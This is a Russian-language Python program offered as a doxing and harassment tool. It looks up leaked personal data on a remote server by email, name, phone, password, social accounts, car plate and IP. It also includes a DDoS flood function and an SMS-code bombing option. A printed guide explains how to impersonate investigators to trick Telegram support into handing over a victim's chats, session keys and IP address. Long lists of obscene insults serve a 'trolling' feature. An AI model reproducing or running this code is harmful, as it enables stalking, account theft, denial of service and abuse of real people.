import smtplib, threading, fake_useragent, string, random, webbrowser, requests, time, os
from faker import Faker
from email.mime.text import MIMEText
from pystyle import Colorate, Colors, Center, Write
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
from colorama import Fore, Style

fake = Faker('ru_RU')

THEMES = {
    "green_to_cyan": Colors.green_to_cyan,
    "red_to_yellow": Colors.red_to_yellow,
    "blue_to_purple": Colors.blue_to_purple,
    "purple_to_blue": Colors.purple_to_blue,
    "yellow_to_red": Colors.yellow_to_red,
    "white_to_black": Colors.white_to_black,  # Добавляем черно-белую тему
}

current_theme = "green_to_cyan"  # Тема по умолчанию

COLOR_CODE = {  # Теперь THEMES определен перед использованием
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
    "BLUE": "\033[1;34m",
}

banner = '''



                     ▄▄▌ ▐ ▄▌ ▄▄▄· .▄▄ · ▄▄▄▄▄▄▄▄ .·▄▄▄▄  
                     ██· █▌▐█▐█ ▀█ ▐█ ▀. •██  ▀▄.▀·██▪ ██ 
                     ██▪▐█▐▐▌▄█▀▀█ ▄▀▀▀█▄ ▐█.▪▐▀▀▪▄▐█· ▐█▌
                     ▐█▌██▐█▌▐█ ▪▐▌▐█▄▪▐█ ▐█▌·▐█▄▄▌██. ██ 
                      ▀▀▀▀ ▀▪ ▀  ▀  ▀▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀▀▀• 
                                           

╔───────────────────╗     ╔───────────────────╗   ╔────────────────────╗
└|1|»  Поиск по почте     └|2|»  Поиск по ФИО     └|3|»  Поиск по номеру
╚───────────────────╝     ╚───────────────────╝   ╚────────────────────╝
╔────────────────────╗    ╔───────────────────╗   ╔──────────────────────╗
└|4|»  Поиск по паролю    └|5|»  Поиск по tg      └|6|»  Поиск по facebook
╚────────────────────╝    ╚───────────────────╝   ╚──────────────────────╝
╔───────────────────╗     ╔───────────────────╗   ╔──────────────────────╗
└|7|»  Поиск по VK        └|8|»  Поиск по Инсте   └|9|»  Поиск по АВТО
╚───────────────────╝     ╚───────────────────╝   ╚──────────────────────╝
                 ╔───────────────────╗  ╔───────────────────╗
                 └|10|»  Поиск по IP    └|11|»  dos attack
                 ╚───────────────────╝  ╚───────────────────╝
╔───────────────────╗     ╔───────────────────╗     ╔─────────────────────╗
└|12|»  Шифр txt          └|13|»  Вектор            └|14|» Gen pass          
╚───────────────────╝     ╚───────────────────╝     ╚─────────────────────╝ 
╔───────────────────╗     ╔───────────────────╗     ╔─────────────────────╗
└|15|»  Gen Лик           └|16|»  Флуд кодами       └|17|»  Осинт по юзу       
╚───────────────────╝     ╚───────────────────╝     ╚─────────────────────╝ 
╔───────────────────╗     ╔───────────────────╗     ╔─────────────────────╗
└|18|» Логи               └|19|»  Троллинг          └|20|»  Троллинг 2.0       
╚───────────────────╝     ╚───────────────────╝     ╚─────────────────────╝ 
╔───────────────────╗     ╔───────────────────╗     ╔─────────────────────╗
└|21|» HLR запрос         └|42|» About Software     └|22|» Сменить тему
╚───────────────────╝     ╚───────────────────╝     ╚─────────────────────╝
'''
splash_text = ''' 



▄▄▌ ▐ ▄▌ ▄▄▄· .▄▄ · ▄▄▄▄▄▄▄▄ .·▄▄▄▄      ▄▄▌ ▐ ▄▌      ▄▄▄  ▄▄▌  ·▄▄▄▄  
██· █▌▐█▐█ ▀█ ▐█ ▀. •██  ▀▄.▀·██▪ ██     ██· █▌▐█▪     ▀▄ █·██•  ██▪ ██ 
██▪▐█▐▐▌▄█▀▀█ ▄▀▀▀█▄ ▐█.▪▐▀▀▪▄▐█· ▐█▌    ██▪▐█▐▐▌ ▄█▀▄ ▐▀▀▄ ██▪  ▐█· ▐█▌
▐█▌██▐█▌▐█ ▪▐▌▐█▄▪▐█ ▐█▌·▐█▄▄▌██. ██     ▐█▌██▐█▌▐█▌.▐▌▐█•█▌▐█▌▐▌██. ██ 
 ▀▀▀▀ ▀▪ ▀  ▀  ▀▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀▀▀•      ▀▀▀▀ ▀▪ ▀█▄▀▪.▀  ▀.▀▀▀ ▀▀▀▀▀• 
                     ║ OWNER: @ElusiveW3b ║
                     ╚────────────────────╝
'''
auth = None
def auth(us, passw): 
    global auth
    authh = (us, passw)
    data = {"l": 12}  
    try: 
        resp = requests.post("http://85.192.30.30:666/gen_pass", json=data, auth=authh)  
    except requests.exceptions.RequestException as e:
        Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
    if resp.status_code == 401:  
        return False
    else:
        auth = authh
        return True

def login():
    while True:
        us = input("Логин: ")
        passw = input("Пароль: ")
        if auth(us, passw):
            print("Вход выполнен успешно!")
            return True
        else:
            print("Неверный логин или пароль. Попробуйте снова.")
            print("Если у вас нет логина и пароля или он недействительный, напишите в Telegram @ElusiveW3b")

def find_username(username):  
    data = {"t": username}  
    try:
        response = requests.post("http://85.192.30.30:666/found_profile", json=data, auth=auth)  
    except requests.exceptions.RequestException as e:
        Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
    if response.status_code == 401:  
        return  

    result = response.json()  
    found_on = result.get("found", [])  

    if found_on == "Не найдено." or not found_on:  
        print(f"Юз '{username}' не найден ни на одной платформе.")  
    else:  
        print(f"Юз '{username}' найден на:")  
        for platform, url in found_on:  
            print(f"- {platform}: {url}")

def cls():
    input(f'\n\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}└ Нажмите Enter для продолжения ')
    os.system('cls' if os.name == 'nt' else 'clear')

def show_splash():
    print(Colorate.Horizontal(THEMES[current_theme], Center.XCenter(splash_text)))
    input(f'\n\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}└ Нажмите Enter для использования софта ')

def Search(Term):
    def make_request(Term):
        data = {"t": str(Term)}
        try:
            response = requests.post("http://85.192.30.30:666/search_data", json=data, auth=auth, timeout=10)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
            return {"result": []}
    
    data = make_request(Term)
    
    if not data.get("result"):
        return
    
    Write.Print("\n\t└──│ Найденные данные:\n", THEMES[current_theme], interval=0.001)
    
    for item in data["result"]:
        if isinstance(item, str) and item == "Не найдено.":
            Write.Print("\t├─── Ничего не найдено", THEMES[current_theme])
            return  
        
        if isinstance(item, dict):
            for key, value in item.items():
                Write.Print(f"\t│ ├ {key} -> ", THEMES[current_theme], interval=0.001)
                Write.Print(f"{value}\n", Colors.white, interval=0.001)
    
    print()
    Write.Print("----======[", THEMES[current_theme], interval=0.005)
    Write.Print("@ElusiveW3b", Colors.white, interval=0.005)
    Write.Print("======----", THEMES[current_theme], interval=0.005)

def dos_attack():
    link = input(f'\t{COLOR_CODE["RESET"]}{COLOR_CODE["BOLD"]}└ Введите ссылку для DDoS атаки {COLOR_CODE["DARK"]}{COLOR_CODE["BOLD"]}→{COLOR_CODE["RESET"]} ')
    
    def dos():
        for _ in range(10): 
            try:
                requests.get(link)
            except requests.exceptions.RequestException:
                pass

    for _ in range(10):
        threading.Thread(target=dos).start()

def scan_number():
    phone = input(Fore.YELLOW + "[?] Введите номер телефона: " + Style.RESET_ALL)
    phoneinfo(phone)

def phoneinfo(phone):
    try:
        parsed_phone = phonenumbers.parse(phone, None)
        if not phonenumbers.is_valid_number(parsed_phone):
            print(Fore.RED + "[!] Ошибка: Недействительный номер телефона\n" + Style.RESET_ALL)
            return
        region = geocoder.description_for_number(parsed_phone, "ru")
        carrier_info = carrier.name_for_number(parsed_phone, "en")
        country = geocoder.country_name_for_number(parsed_phone, "en")
        formatted_number = phonenumbers.format_number(parsed_phone, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
        is_valid = phonenumbers.is_valid_number(parsed_phone)
        is_possible = phonenumbers.is_possible_number(parsed_phone)
        timezones = timezone.time_zones_for_number(parsed_phone)
        number_type = phonenumbers.number_type(parsed_phone)
        type_description = {
            phonenumbers.PhoneNumberType.MOBILE: "Мобильный",
            phonenumbers.PhoneNumberType.FIXED_LINE: "Стационарный",
            phonenumbers.PhoneNumberType.FIXED_LINE_OR_MOBILE: "Стационарный/Мобильный",
            phonenumbers.PhoneNumberType.VOIP: "VoIP",
            phonenumbers.PhoneNumberType.PREMIUM_RATE: "Премиум",
            phonenumbers.PhoneNumberType.TOLL_FREE: "Бесплатный",
            phonenumbers.PhoneNumberType.UNKNOWN: "Неизвестно"
        }.get(number_type, "Неизвестно")
        print_phone_info = f"""
{Fore.GREEN}[+] Информация о номере:{Style.RESET_ALL}
  [+] Форматированный номер: {formatted_number}
   └[+] Страна: {country if country else 'Не найдено'}
     └[+] Регион: {region if region else 'Не найдено'}
       └[+] Оператор: {carrier_info if carrier_info else 'Не найдено'}
         └[+] Тип номера: {type_description}
           └[+] Активен: {is_possible}
             └[+] Валидность: {is_valid}
               └[+] Часовые пояса: {", ".join(timezones) if timezones else 'Не найдено'}
                 └[@] Ссылки:
    [+] Telegram: https://t.me/{phone}
     └[+] WhatsApp: https://wa.me/{phone}
       └[+] Viber: https://viber.click/{phone}
"""
        print(print_phone_info)
        input(Fore.YELLOW + "[?] Нажмите Enter, чтобы продолжить..." + Style.RESET_ALL)
        show_banner() # Здесь замените show_banner() на функцию, которая отображает ваш баннер
    except phonenumbers.phonenumberutil.NumberParseException:
        print(Fore.RED + "[!] Ошибка: Неправильный формат номера телефона\n" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[!] Произошла ошибка -> {e}\n" + Style.RESET_ALL)

def generate_long_message():
    """Генерирует длинное сообщение из 50-60 слов."""
    words = [
        "Трисучьепадловая выссака", "многоблядская проскотошлюха", "гнидское выебопропиздище",
        "многоебоный херун", "стервозное тригнидопроговно", "гандонский пропердок",
        "триговногнойная трипиздопроманда", "проперданутое блядодерьмо", "высраномудоватое дерьмище",
        "херопроскотское дерьмище", "просволотопрохуевое задрочепрогнидище", "залупский простервопрохерун",
        "говнозалупский блядок", "пердодроченное многопиздище", "дрочепропердоватая манда",
        "выебучий трипиздодрочун", "трисраное говно", "сраногнойная сволота", "высраная сволотосука",
        "прогнидская гнида", "гандонохеровая мандогнидища", "пердомудоватый задрочепидер",
        "выпердоговенный хуй", "проссаная сучьескотина", "трипердоватая триссанохуина",
        "падлопросраное мандище", "выпердоватое пердопромудище", "шлюхское задрочепроговно",
        "падлопроскотское говно", "мудопрошлюхское хуеговно", "падловая многопизда",
        "выпердопроссаная гноепадла", "задроченное тримандище", "многоебоватая срака",
        "многоебучий хуеплёт", "промудоватая задрочила", "пиздопроговенная хуепропадла",
        "гандоноскотская триссака", "многоебошлюхская многопиздопропадла",
        "просволотохуеватое тримудище", "триперданутая просволота",
        "тримандопростервозный пиздун", "выссаногнойное говнодерьмище",
        "падловый трипиздопроскотложец", "ссаное говнодерьмище", "прогандонский мудак",
        "жоповатое тригнидопрохерище", "сраный многопиздоблядун", "гандонский гнидоблядун",
        "гнойное прогнидопрохуевающее", "просволотская дрочепросволота",
        "пидероперданное проссаномудище", "многостервохеровый задрочун",
        "триговноперданутое сволотопродерьмо", "многомудоватое ссанопиздище",
        "просволотопрошлюхский выссанохуеплёт", "высранохуевое выблядодерьмо",
        "задроченный промудак", "задроческотское говно", "гандоносучий гандон",
        "пиздатая просволота", "мандопроблядоватая трисука", "дерьмовое трипиздохерище",
        "просраноперданутая мандоскотина", "скотское задрочепрогнидище", "ебоватая скотина",
        "дерьмопрозалупское дерьмо", "триссаный промудак", "многостервохуенная гандоносрака",
        "гнойная многостервопропидрила", "шлюхский хероговнюк", "блядогандонский стервец",
        "просволотская проскотина", "просраная многожопа", "сучий промудопердун",
        "блядопростервозная дроческотина", "простервоблядовое промудище",
        "залупская сучьемудища", "гноепромандоватое промандище",
        "выссаногнойное многостерводерьмо", "тригнидская многоблядопросволота",
        "задроченная пидрила", "дроченная дрочила", "дрочепроговенное мандопродерьмище",
        "проссаное стервопиздище", "пиздожопская пропердомандища", "скотское мудище",
        "перданная скотопродерьмища", "пиздатая просраносука", "хуессаная пидрила",
        "стервопроблядское блядище", "многоблядопропадловый скотложец",
        "сраная падлопрошлюха", "промандоговенная жопопроебина", "говноперданный многоблядь",
        "перданное промудище", "пердопрогнойная мандопростерва", "выперданный задрочун",
        "да заебись ты трижды злоебучим проебом",
        "залупоглазое пиздопроeбище семиблядским троепиздием", "восьмирукий пятихуй",
        "тримондоеби твое восьмиблядское троепиздище", "хуесучий анахронот",
        "запиздомедузь еби твою мудоблядскую глотку", "проблядь сучья", "ебло мохноногое",
        "страхопиздище залупоглазое", "вхуематери архипиздоит", "ебаный в рот",
        "гандонный педераст", "вафлеотстойник семиструйный", "перхоть подзалупная",
        "блядь перемондоебленная", "триеблоостомондовевшая охуебаннейшая",
        "ебиблядская пиздопроушина с перекосоебленным нахуй ебалом",
        "мондозалупленной болтохуярой", "залупа недоебанная",
        "хуеблядипиздожабья замудоебина", "засракомондохуй твое еболожье мондило",
        "злоебучий пиздохуй", 'давай', 'там', 'выжимай', 'свои', 'говнозаготовки,', 'используй', 'против', 'моего', 'хуя,', 
        'тут', 'просто', 'напросто', 'не', 'выживешь', 'против', 'моего', 'хуя,', 'я', 'тебя', 'днями', 'ночами', 'буду', 'пиздить,',
        'я', 'тебя', 'своей', 'спермой', 'тут', 'обкончаю,', 'ты', 'поняла', 'или', 'нет,', 'распиздяйка', 'ебучая', 'трахакрыльное,',
        'тупо', 'своей', 'залупой', 'буду', 'рвать', 'головешку', 'твоей', 'матери', 'шлюхи', 'в', 'данной', 'конференции', ',накончаю',
        'в', 'пиздак', 'твоей', 'матери,', 'шалава', 'ебанная,',
        'ты', 'куда', 'там', 'свои', 'кони', 'сдвинула', 'я', 'тебя', 'не', 'могу', 'понять,',
        'я', 'же', 'твое', 'ебало', 'тут', 'перетрахаю', 'буквально', 'как', 'нехуй', 'делать,', 'свинья', 'ебучая',
        'ты', 'куда', 'там', 'свой', 'прах', 'дело?'
    ]
    random.shuffle(words)
    return " ".join(words[:55])  

def generate_insults(num_short=5, num_long=5):
    all_insults = [
        "Трисучьепадловая выссака", "многоблядская проскотошлюха", "гнидское выебопропиздище",
        "многоебоный херун", "стервозное тригнидопроговно", "гандонский пропердок",
        "триговногнойная трипиздопроманда", "проперданутое блядодерьмо", "высраномудоватое дерьмище",
        "херопроскотское дерьмище", "просволотопрохуевое задрочепрогнидище", "залупский простервопрохерун",
        "говнозалупский блядок", "пердодроченное многопиздище", "дрочепропердоватая манда",
        "выебучий трипиздодрочун", "трисраное говно", "сраногнойная сволота", "высраная сволотосука",
        "прогнидская гнида", "гандонохеровая мандогнидища", "пердомудоватый задрочепидер",
        "выпердоговенный хуй", "проссаная сучьескотина", "трипердоватая триссанохуина",
        "падлопросраное мандище", "выпердоватое пердопромудище", "шлюхское задрочепроговно",
        "падлопроскотское говно", "мудопрошлюхское хуеговно", "падловая многопизда",
        "выпердопроссаная гноепадла", "задроченное тримандище", "многоебоватая срака",
        "многоебучий хуеплёт", "промудоватая задрочила", "пиздопроговенная хуепропадла",
        "гандоноскотская триссака", "многоебошлюхская многопиздопропадла",
        "просволотохуеватое тримудище", "триперданутая просволота",
        "тримандопростервозный пиздун", "выссаногнойное говнодерьмище",
        "падловый трипиздопроскотложец", "ссаное говнодерьмище", "прогандонский мудак",
        "жоповатое тригнидопрохерище", "сраный многопиздоблядун", "гандонский гнидоблядун",
        "гнойное прогнидопрохуевающее", "просволотская дрочепросволота",
        "пидероперданное проссаномудище", "многостервохеровый задрочун",
        "триговноперданутое сволотопродерьмо", "многомудоватое ссанопиздище",
        "просволотопрошлюхский выссанохуеплёт", "высранохуевое выблядодерьмо",
        "задроченный промудак", "задроческотское говно", "гандоносучий гандон",
        "пиздатая просволота", "мандопроблядоватая трисука", "дерьмовое трипиздохерище",
        "просраноперданутая мандоскотина", "скотское задрочепрогнидище", "ебоватая скотина",
        "дерьмопрозалупское дерьмо", "триссаный промудак", "многостервохуенная гандоносрака",
        "гнойная многостервопропидрила", "шлюхский хероговнюк", "блядогандонский стервец",
        "просволотская проскотина", "просраная многожопа", "сучий промудопердун",
        "блядопростервозная дроческотина", "простервоблядовое промудище",
        "залупская сучьемудища", "гноепромандоватое промандище",
        "выссаногнойное многостерводерьмо", "тригнидская многоблядопросволота",
        "задроченная пидрила", "дроченная дрочила", "дрочепроговенное мандопродерьмище",
        "проссаное стервопиздище", "пиздожопская пропердомандища", "скотское мудище",
        "перданная скотопродерьмища", "пиздатая просраносука", "хуессаная пидрила",
        "стервопроблядское блядище", "многоблядопропадловый скотложец",
        "сраная падлопрошлюха", "промандоговенная жопопроебина", "говноперданный многоблядь",
        "перданное промудище", "пердопрогнойная мандопростерва", "выперданный задрочун",
        "да заебись ты трижды злоебучим проебом",
        "залупоглазое пиздопроeбище семиблядским троепиздием", "восьмирукий пятихуй",
        "тримондоеби твое восьмиблядское троепиздище", "хуесучий анахронот",
        "запиздомедузь еби твою мудоблядскую глотку", "проблядь сучья", "ебло мохноногое",
        "страхопиздище залупоглазое", "вхуематери архипиздоит", "ебаный в рот",
        "гандонный педераст", "вафлеотстойник семиструйный", "перхоть подзалупная",
        "блядь перемондоебленная", "триеблоостомондовевшая охуебаннейшая",
        "ебиблядская пиздопроушина с перекосоебленным нахуй ебалом",
        "мондозалупленной болтохуярой", "залупа недоебанная",
        "хуеблядипиздожабья замудоебина", "засракомондохуй твое еболожье мондило",
        "злоебучий пиздохуй", "че ты отцу в хуй под сменой если все зеркала неразбиваемые все зелья не правды разбил об тебя матери после хуя",
        "отрицай дефы деду в зеркальный хуй вримечтай после дика ебыря твоего все времена ники инициалы ебыри твои отрицания летят бате в хуй как фантазии", 
        "с какими словами падал на хуй языком после каких слов тебя ебали если все твое родное",
        "базарь бате хуем в рот я ты ври мечтай вопрос вхуй команда стрелку в хуй без чего мать твою ебут наименуй вхуй инициалы мамка твоя шлюха",
        "че бате под сменой дрочил кому представь вхуй помечтай вхуй скипни вхуй наименуй вхуй",
        "Мы все язык твоего отца что бате в хуй под сменой если все это ты говори бате под инициалом если мы все противник",
        "Что мамке после хуя до и после не роботают фантомы на лице у  (ник) папа выебал те мать и сказал до и после не роботают я это ты в хуй говори после хуя я это ты мамке под ником ники мать все Ник  он щя в хуй мамке скажет на лице покажет сказку расскажет соврет в хуй отца отрицания мать твою убить до и после хуй те в рот я это ты мамке под силового хуя у тя во рту",
        "че бате под сменой смена мать твоя ври мечтай скипай представляй временные в рот тя ебут",
        "говори батьку под сменой во рту у тя мой хуй как ври мечтай представляй",
        "че батьку с хуем в жопе че в виде фантазии на дик все ты лан отвернись от батька мечтай в хуй че мамке сказалсобери проки с хуя какой хуй мой ворту у тя так тих я ща мать твою тут убью че батькуракообразное создание че батьку с хуем в жопе в виде фантазии на дик мечтай"
    ]

    short_insults = [insult for insult in all_insults if len(insult.split()) <= 4]
    long_insults = [insult for insult in all_insults if len(insult.split()) >= 8]

    insults = random.sample(short_insults, min(num_short, len(short_insults))) + \
               random.sample(long_insults, min(num_long, len(long_insults)))
    random.shuffle(insults)
    return insults

show_splash()

if login():
    while True:
        print(Colorate.Horizontal(THEMES[current_theme], Center.XCenter(banner)))
        select = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├ [+] WastedSoftWare: {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')

        if select == '1':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите почту {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '2':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите ФИО+ДР {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '3':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите номер {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '4':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите пароль {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '5':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите Telegram {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '6':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите Facebook {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '7':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите VKontakte {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '8':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите Instagram {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '9':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Введите номер автомобиля {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '10':
            Term = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├ Введите IP {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            Search(Term)
            cls()
        elif select == '11':
            dos_attack()
            cls()
        elif select == '12':
            text = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├ Введите текст для шифрования {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            data = {"t": str(text)}
            try: 
                resp = requests.post("http://85.192.30.30:666/encrypt", json=data, auth=auth)  
            except requests.exceptions.RequestException as e:
                Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
            dildo = resp.json()
            encrypted_text = dildo.get('encrypt')
            print(f'\t{COLOR_CODE["YELLOW"]}{COLOR_CODE["RESET"]}└ Зашифрованный текст: {encrypted_text}{COLOR_CODE["RESET"]}')
            cls()
        elif select == '13':
            phone_number = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├ Введите номер телефона (например, 79129663498) {COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}→{COLOR_CODE["RESET"]} ')
            data = {"t": str(phone_number)}
            try: 
                resp = requests.post("http://85.192.30.30:666/gen_links", json=data, auth=auth)  
            except requests.exceptions.RequestException as e:
                Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
            dildo = resp.json
            whatsapp_link = dildo.get('whatsapp')
            telegram_link = dildo.get('tg')
            vk_link = dildo.get('vk')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Ссылки для номера {phone_number}:{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  ├ WhatsApp: {whatsapp_link}{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  ├ Telegram: {telegram_link}{COLOR_CODE["RESET"]}')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}  └ ВКонтакте: {vk_link}{COLOR_CODE["RESET"]}')
            cls()
        elif select == '14':
            length = int(input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├ Введите длину пароля: '))
            data = {"l": str(length)}
            try: 
                resp = requests.post("http://85.192.30.30:666/gen_pass", json=data, auth=auth)  
            except requests.exceptions.RequestException as e:
                Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
            dildo = resp.json()
            pasw = dildo.get('p')
            print(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}└ Пароль: {pasw}{COLOR_CODE["RESET"]}')
            cls()
        elif select == '15':
            try: 
                resp = requests.post("http://85.192.30.30:666/fake_user", auth=auth)  
            except requests.exceptions.RequestException as e:
                Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
            fi = resp.json()
            full_info = fi.get('i')
            Write.Print(f"\t└ {full_info}", THEMES[current_theme])
           
            cls()
        elif select == '16':
            number = int(input("Введите номер телефона: "))
            data = {"t": str(number)}
            try: 
                resp = requests.post("http://85.192.30.30:666/send_codes", json=data, auth=auth)  
            except requests.exceptions.RequestException as e:
                Write.Print(f"\t└ Ошибка при выполнении запроса: {e}", THEMES[current_theme])
            dildo = resp.json()      
            if dildo.get('status') == "success":                
                Write.Print(f"\t└ Коды успешно отправлены.", THEMES[current_theme])
            else:
                Write.Print(f"\t└ Ошибка при отправке кодов.", THEMES[current_theme])
            cls()
        elif select == '17':
            try:
                username = input(f'\t{COLOR_CODE["GREEN"]}{COLOR_CODE["RESET"]}├ Введите username для поиска: {COLOR_CODE["RESET"]}')
                find_username(username)
            except Exception as e:
                print(f'{COLOR_CODE["RED"]}└ Ошибка: {e}{COLOR_CODE["RESET"]}')
            cls()
        elif select == '18':
            print(f'''
Чтобы заполучить логи с аккаунта жертвы, нам нужны эти данные, которые мы можем найти на аккаунте жертвы:

[ID]; [Number]; [Username]

Получив их, мы составляем заранее подготовленное подобного рода письмо:

"Здравствуйте. На данный момент на вашей платформе появился кибер преступник, чья личность нас заинтересовала из-за массовых заявлений, а так-же ложных минирований от его имени. Наша команда IT специалистов просит вас выдать сервера данного пользователя вашей платформы: [ID]; [Number]; [Username].
Если вы согласны, то просим предоставить информацию на нашу гражданскую почту [email], для завершения дела. Надеемся на сотрудничество. "

Оф почты тг: ceo@telegram.org, DMCA@telegram.org, sms@telegram.org, recover@telegram.org, abuse@telegram.org, topCA@telegram.org, security@telegram.org, support@telegram.org, sticker@telegram.org.

Вставляем офицальные почты телеграм поддержки, ждём не менее двух суток и проверяем почту. Нам выдадут ссылку на скачивание с подобным названием: "RUнаборцифр" - заходя в него, первым делом мы видим папку "Profile_1" - что является ТДатой, а точнее - ключом доступа к аккаунту. Далее мы видим папку с названием "@$#/". Зашёв в неё, мы увидем много .pdf файлов с не понятными названиями - чаты нашей жертвы. Вышев с этой папки, мы видем папку "Proxy". Если жертва не подключала прокси, то её не будет. Далее, папка "Photos", в которой ссылки на все аватарки которые когда либо были на аккаунте нашей жертвы. И последняя папка с названием "$$$" - в ней мы найдём все изменения профиля, номер телефона и истинный айпи адрес вместе со всеми устройствами.

Рекомендация: письма стоит отправлять 4-7 утра по Московскому времени, а так-же стоит закинуть письмо с переводом на английский.
''')
            cls()
            
        elif select == '19':  # Исправленный отступ здесь
            print(f'{COLOR_CODE["RED"]}[-]{COLOR_CODE["RESET"]} Выданные троллинг оски:\n')
            insults = generate_insults(50)  # Генерируем 10 оскорблений (или сколько вам нужно)
            for insult in insults:
                print(f'{COLOR_CODE["GREEN"]}[+]{COLOR_CODE["RESET"]} {insult}')
            input(f'\n{COLOR_CODE["RED"]}└{COLOR_CODE["RESET"]} Нажмите Enter для чтобы вернуться в меню')
            cls()
            
        elif select == '22':  # Выбор темы
            print(f'{COLOR_CODE["RED"]}[-]{COLOR_CODE["RESET"]} Выберите тему:\n')
            themes = list(THEMES.keys())
            for i, theme in enumerate(themes):
                if theme == "green_to_cyan":
                    print(f'{COLOR_CODE["GREEN"]}[{i + 1}]{COLOR_CODE["RESET"]} Зеленый → Голубой')
                elif theme == "red_to_yellow":
                    print(f'{COLOR_CODE["RED"]}[{i + 1}]{COLOR_CODE["RESET"]} Красный → Желтый')
                elif theme == "blue_to_purple":
                    print(f'{COLOR_CODE["BLUE"]}[{i + 1}]{COLOR_CODE["RESET"]} Синий → Фиолетовый')
                elif theme == "purple_to_blue":
                    print(f'{COLOR_CODE["PINK"]}[{i + 1}]{COLOR_CODE["RESET"]} Фиолетовый → Синий')
                elif theme == "yellow_to_red":
                    print(f'{COLOR_CODE["YELLOW"]}[{i + 1}]{COLOR_CODE["RESET"]} Желтый → Красный')
                elif theme == "white_to_black":
                    print(f'{COLOR_CODE["DARK"]}[{i + 1}]{COLOR_CODE["RESET"]} Белый → Черный')  # Добавляем черно-белую тему
            while True:
                try:
                    choice = int(input(f'\n{COLOR_CODE["RED"]}└{COLOR_CODE["RESET"]} Введите номер темы: ')) - 1
                    if 0 <= choice < len(themes):
                        current_theme = themes[choice]
                        print(f'{COLOR_CODE["GREEN"]}[+]{COLOR_CODE["RESET"]} Тема изменена на {current_theme}')
                        break
                    else:
                        print(f'{COLOR_CODE["RED"]}└{COLOR_CODE["RESET"]} Неверный номер темы. Попробуйте снова.')
                except ValueError:
                    print(f'{COLOR_CODE["RED"]}└{COLOR_CODE["RESET"]} Неверный ввод. Введите число.')
            input(f'\n{COLOR_CODE["RED"]}└{COLOR_CODE["RESET"]} Нажмите Enter для чтобы вернуться в меню')
            cls()

        elif select == '20':  # Функция для генерации длинного сообщения
            message = generate_long_message()
